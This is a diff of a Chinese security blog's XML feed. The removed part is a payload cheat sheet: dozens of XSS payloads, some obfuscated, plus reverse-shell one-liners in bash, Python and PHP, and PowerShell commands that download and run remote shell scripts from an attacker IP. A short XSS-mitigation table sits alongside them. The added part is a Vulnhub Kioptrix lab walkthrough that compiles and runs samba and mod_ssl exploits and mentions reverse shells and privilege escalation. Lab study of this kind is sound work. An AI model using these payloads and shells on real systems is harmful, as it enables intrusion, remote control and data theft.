-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>article</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>payload记录</title>
-    <url>/2025/04/24/payload%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p><strong>自动弹窗优先级</strong></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video/audio &gt; details &gt; marquee &gt; math</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加载弹窗</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加密payload</span><br><span class="line">   &lt;svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line">   #svg内嵌代码1</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;animate onbegin=alert(1) attributeName=x /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码2</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;set onbegin=alert(1) /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码3</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;foreignObject onload=alert(1)&gt;&lt;/foreignObject&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #点击  # JS 协议</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line">       </span><br><span class="line">   #鼠标移动代码2</span><br><span class="line">   &lt;math&gt;</span><br><span class="line">     &lt;mtext onmouseover=alert(1)&gt;X&lt;/mtext&gt;</span><br><span class="line">   &lt;/math&gt;</span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line">   #非 常见标签</span><br><span class="line">       #万能嵌入器#早期网页：&lt;embed src=&quot;movie.swf&quot;&gt;</span><br><span class="line">       &lt;embed src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">       #详细信息</span><br><span class="line">       &lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">       #h5视频标签</span><br><span class="line">       &lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">       #h5音频标签</span><br><span class="line">       &lt;audio src=x onerror=alert(1)&gt;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>
-
-<p>注：html解析<strong>HTML 实体编码</strong></p>
-<p>​	例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;quot;   html解码成	&quot;</span><br></pre></td></tr></table></figure>
-
-<p>注：<strong>JavaScript Unicode 转义（\uXXXX）</strong> 和 <strong>URL 编码（%XX）</strong></p>
-<p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
-<p>当然文件预览的方向也可以尝试</p>
-<p>可以通过<a href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
-<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
-<p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
-<p>用ai改了一下，python3也可以用</p>
-<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
-<h3 id="若页面存在预览和上传"><a href="#若页面存在预览和上传" class="headerlink" title="若页面存在预览和上传"></a>若页面存在预览和上传</h3><p>则<a href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/xss/xss.pdf">xss.pdf</a></p>
-<h3 id="经典示例："><a href="#经典示例：" class="headerlink" title="经典示例："></a>经典示例：</h3><h5 id="get参数变更"><a href="#get参数变更" class="headerlink" title="get参数变更"></a>get参数变更</h5><p>示例poc：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.xxx.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line">	解析：</span><br><span class="line"></span><br><span class="line">abc&#x27;%3breturn+false&#125;)%3b&#125;)%3balert`xss ;&lt;%2fscript&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
-<p><img src="/../image/xss/expected_request.png"></p>
-<h2 id="xss修复建议"><a href="#xss修复建议" class="headerlink" title="xss修复建议"></a>xss修复建议</h2><table>
-<thead>
-<tr>
-<th><strong>维度</strong></th>
-<th><strong>安全策略与行为</strong></th>
-<th><strong>技术细节与风险点说明</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>编码解析</strong></td>
-<td><strong>单次实体解码</strong></td>
-<td>HTML 实体（如 <code>&lt;</code>）会被还原为 <code>&lt;</code>，但 <strong>URL 编码（%xx）不会被解析</strong>。这种设计彻底切断了“解码-&gt;绕过-&gt;再解码”的二次解析攻击链。</td>
-</tr>
-<tr>
-<td><strong>属性过滤</strong></td>
-<td><strong>属性级白名单</strong></td>
-<td>仅保留 <code>href</code> 和 <code>src</code> 等必要路径属性。<strong>所有 <code>on\*</code> 事件、<code>style</code> 及自定义属性全部抹除</strong>，防止 CSS 表达式或 JS 事件注入。</td>
-</tr>
-<tr>
-<td><strong>协议限制</strong></td>
-<td><strong>严格协议校验</strong></td>
-<td>拦截 <code>javascript:</code> 和 <code>data:</code> 伪协议。采用<strong>先解码后校验</strong>的逻辑，防止利用编码后的非法协议绕过正则匹配。</td>
-</tr>
-<tr>
-<td><strong>组件重写</strong></td>
-<td><strong>主动安全配置</strong></td>
-<td>对 Flash 等插件不只是过滤，而是<strong>重写属性</strong>。强制设置 <code>allowscriptaccess=&quot;never&quot;</code>（禁调 JS）和 <code>allownetworking=&quot;internal&quot;</code>（限制外联）。</td>
-</tr>
-<tr>
-<td><strong>资源控制</strong></td>
-<td><strong>内容安全策略 (CSP)</strong></td>
-<td>配合域名白名单，限制仅加载官方脚本。这是防止外部恶意脚本注入的最后一道防线。</td>
-</tr>
-<tr>
-<td><strong>自动处理</strong></td>
-<td><strong>自动链接转换</strong></td>
-<td>仅在安全校验通过后，将纯文本 URL 转换为 <code>&lt;a&gt;</code> 标签，确保输出的 DOM 结构可控。</td>
-</tr>
-</tbody></table>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h1><table>
-<thead>
-<tr>
-<th><strong>方式</strong></th>
-<th><strong>依赖工具</strong></th>
-<th><strong>优点</strong></th>
-<th><strong>缺点</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Bash</strong></td>
-<td>Bash Shell</td>
-<td>无需安装，极其通用</td>
-<td>某些精简系统（如 Alpine）可能不支持</td>
-</tr>
-<tr>
-<td><strong>NC (FIFO)</strong></td>
-<td>netcat</td>
-<td>几乎所有系统都有 nc</td>
-<td>命令较长，容易出错</td>
-</tr>
-<tr>
-<td><strong>Python</strong></td>
-<td>Python 2&#x2F;3</td>
-<td>交互性强，稳定</td>
-<td>需要预装 Python 环境</td>
-</tr>
-<tr>
-<td><strong>PHP</strong></td>
-<td>PHP-cli</td>
-<td>Web 服务器常用</td>
-<td>需要 PHP 命令行模式支持</td>
-</tr>
-</tbody></table>
-<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="string">&quot;192.168.1.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=<span class="number">8080</span>;</span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>,<span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$proc</span>=<span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh -i&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>),<span class="variable">$pipes</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.1.1&quot;,监听端口);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="RCE-Reverse-Shell"><a href="#RCE-Reverse-Shell" class="headerlink" title="RCE Reverse Shell"></a>RCE Reverse Shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#宿主</span></span><br><span class="line">nc -lvnp <span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Python-Reverse-Shell"><a href="#Python-Reverse-Shell" class="headerlink" title="Python Reverse Shell"></a>Python Reverse Shell</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot;,监听端口));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">#python</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;,<span class="number">8080</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);subprocess.<span class="keyword">call</span>([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Windows-Reverse-Shell"><a href="#Windows-Reverse-Shell" class="headerlink" title="Windows Reverse Shell"></a>Windows Reverse Shell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powercat反弹</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse UDP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellUdp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse ICMP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellIcmp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellIcmp</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><a href="https://github.com/besimorhino/powercat">工具</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/2485156">Windows环境下反弹shell各类姿势-腾讯云开发者社区-腾讯云</a></p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>payload</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>frida和逆向的学习</title>
     <url>/2026/02/08/frida%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>之前用<code>frida</code>只晓得使用已经构建好的<code>js</code>，还是系统的学习一下比较好，遇到一些自定义的类也可以自己解决，可以去看大佬们的<a href="https://github.com/hookmaster/frida-all-in-one"><code>frida</code>操作手册</a>、<a href="https://bbs.kanxue.com/thread-289545.htm">某加固新版frida检测绕过-trace</a>、<a href="https://www.freebuf.com/articles/others-articles/447681.html">某当劳 Frida 检测</a>，哔哩哔哩上也有相关课程<a href="https://www.bilibili.com/video/BV178a9z5Ezc/?vd_source=62ec56a0e96ac07702343ec20500f1cc">吾爱破解安卓逆向入门教程《安卓逆向这档事》_哔哩哔哩_bilibili</a>、<a href="https://www.bilibili.com/video/BV1rsZaBBE3V/?vd_source=62ec56a0e96ac07702343ec20500f1cc">小肩膀出品安卓逆向课程_哔哩哔哩_bilibili</a>、<a href="https://www.bilibili.com/video/BV1ZT421k7xw/">Python入门&#x2F;Frida逆向 哔哩哔哩_bilibili</a>等</p>
@@ -661,6 +308,388 @@
       </categories>
       <tags>
         <tag>Notes</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>oscp—vulnhub靶场训练</title>
+    <url>/2025/08/25/oscp_attack-log/</url>
+    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h2><p><strong>靶场</strong>：<a href="https://www.vulnhub.com/?q=Kioptrix">https://www.vulnhub.com/?q=Kioptrix</a></p>
+<p>注意网络联通问题:</p>
+<p>1&gt;网卡需要删除重建<code>.vmx</code>里面，要不然默认桥接</p>
+<p>2&gt;自建局域网宿主机为头即可<code>192.168.xx.1</code>，无需网关和<code>dns</code></p>
+<p>3&gt;可以用<code>centos7</code>虚拟机看一下会自动分配<code>ip</code>吗，如果分配的奇怪可能是因为没有打开<code>VMware DHCP Service</code>或<code>VMware NAT Service</code>，<code>192.168.xx.254</code>一般是<code>VM</code>的<code>DHCP</code>服务器，没有的话可能就是没开启<code>DHCP</code></p>
+<p><strong>工具</strong>：<code>searchsploit</code>(<code>kali</code>)，<a href="https://gitlab.com/exploit-database/">Exploit-DB</a>，<a href="https://github.com/peass-ng/PEASS-ng">扫描提权</a></p>
+<span id="more"></span>
+
+<p>准备条件(我用的是<code>wsl2</code>的<code>kali</code>)：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br></pre></td></tr></table></figure>
+
+<h1 id="Kioptrix"><a href="#Kioptrix" class="headerlink" title="Kioptrix"></a>Kioptrix</h1><h3 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h3><p><code>练习工具的使用</code></p>
+<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#全端口扫描</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span></span><br></pre></td></tr></table></figure>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---寻找低版本的框架或者容器查找[exp]---</span><br><span class="line">nikto -host <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br><span class="line">nuclei -u <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-0.png" alt="扫描的tcp连接内容"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-1.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查找exp利用</span><br><span class="line">searchsploit mod_ssl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2.png" alt="扫描的tcp连接内容"></p>
+<p>对比可得3个可尝试exp</p>
+<hr>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc -o exploit <span class="number">47080</span>.c -lcrypto</span><br><span class="line">#运行对应版本</span><br><span class="line">./exploit -h								#帮助</span><br><span class="line">./exploit | grep apache-<span class="number">1</span>.<span class="number">3</span>.<span class="number">20</span>				#版本</span><br><span class="line">./exploit <span class="number">0</span>x6b <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span> <span class="number">80</span> -c <span class="number">50</span>			#运行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/3.png" alt="扫描的tcp连接内容"></p>
+<p>流程是这么个流程，但是这个exp太过于久远了，难以运行</p>
+<p>所以换其它的不需要lcrypto的exp运行</p>
+<h5 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#存在<span class="number">139</span>端口samba服务，且得知系统为linux框架</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
+<p>搜索该服务：</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-0.png" alt="扫描的tcp连接内容"></p>
+<p>发现非常多的exp，但是nmap没有版本，难不成这么多exp一个个试？</p>
+<p>有两种方法msfconsole&#x2F;nuclei跑出版本，msfconsole跑出版本前提是需要存在版本泄露的漏洞，虽然nuclei也是一样，但是架不住快呀:</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-1.png" alt="扫描的tcp连接内容"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-2.png" alt="扫描的tcp连接内容"></p>
+<hr>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#或者nuclei直接跑出版本号</span><br><span class="line">nuclei.exe -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>:<span class="number">139</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-3.png" alt="扫描的tcp连接内容"></p>
+<p>跑出版本2.2.1a就可以直接跑小于2.2.8这个版本的了</p>
+<p>直接编译运行即可</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc <span class="number">10</span>.c -o samba_exp		#-o为输出文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">./samba_exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5-2.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#运行</span><br><span class="line">./samba_exp -b0 <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>	#-b为目标，<span class="number">0</span>为linux</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/6.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">找出版本后直接在msfconsole上搜索exp跑也可以</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/0.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">其他的服务版本都很低，可以信息搜集后用工具跑，低权限就uname -a查看内核版本，看searchsploit里面有无提权exp，或者直接cs上线跑提权工具</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1.渗透主要是信息搜集</p>
+<p>2.主要练习了工具使用</p>
+<h4 id="参考的文章"><a href="#参考的文章" class="headerlink" title="参考的文章"></a>参考的文章</h4><p><a href="https://www.cnblogs.com/KUANTECH/p/17941528"><code>Lab 1-Vulnhub - Kioptix Level 1 - KUANTECH - </code>博客园</a></p>
+<hr>
+<h3 id="Kioptrix-Level-2"><a href="#Kioptrix-Level-2" class="headerlink" title="Kioptrix Level 2"></a>Kioptrix Level 2</h3><p><code>web测试</code></p>
+<h5 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h5><p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_2/nmap-1.png" alt="信息搜集"></p>
+<h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#存在sql注入</span><br><span class="line">http://192.168.xxx.131/index.php</span><br><span class="line">#存在命令执行</span><br><span class="line">http://192.168.xxx.131/pingit.php</span><br></pre></td></tr></table></figure>
+
+<p>存在<code>web</code>权限，直接反弹<code>shell</code>，然后发现还有<code>gcc</code>、<code>wget</code>、<code>java</code>和<code>python</code>等环境齐全，通过<a href="https://github.com/peass-ng/PEASS-ng">扫描提权</a>，然后直接<a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz">工具</a>梭哈即可</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_2/RCE-2.png" alt="命令执行"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_2/PrivEsc-1.png" alt="提权"></p>
+<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>1.熟悉<code>owasp top 10</code>漏洞</p>
+<p>2.渗透测试的思路</p>
+<h3 id="Kioptrix-Level-3"><a href="#Kioptrix-Level-3" class="headerlink" title="Kioptrix Level 3"></a>Kioptrix Level 3</h3><p><code>web测试</code></p>
+<p>注意：需要将下面的放到你的hosts文件内</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ip&gt; kioptrix3.com	#靶场</span><br><span class="line"></span><br><span class="line">#C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">#/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h5 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>测试：</p>
+<p>​	可以在网上搜<code>LotusCMS</code>的源码或者直接搜它的历史漏洞之类的，但是今天搜历史漏洞可以把它老底都暴光，搜源码，然后看对应接口长什么样子的，保证一定的公平性。</p>
+<p>index.php的源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;install.php&quot;</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: install.php&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;core/lib/router.php&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><h6 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h6><img src="../image/oscp-image-log/easy/Kioptrix_Level_3/源码-1.png" alt="php" style="zoom:60%;" />
+
